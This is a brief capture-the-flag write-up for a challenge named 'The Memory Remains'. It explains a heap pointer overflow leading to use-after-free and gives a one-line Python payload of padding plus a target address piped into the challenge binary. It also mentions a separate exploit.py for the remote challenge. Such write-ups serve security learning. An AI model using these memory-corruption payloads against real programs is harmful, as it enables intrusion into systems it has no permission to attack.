# The Memory Remains Writeup

Overflow a heap pointer to execute a use after free attack. This will solve the challenge that is locally running.

```bash
# 0x804a174 is &centari->cluster
python -c 'print "0"*72 + "\x74\xa1\x04\x08"' | ./the_memory_remains
```

The `exploit.py` script will solve the challenge that is running remotely.
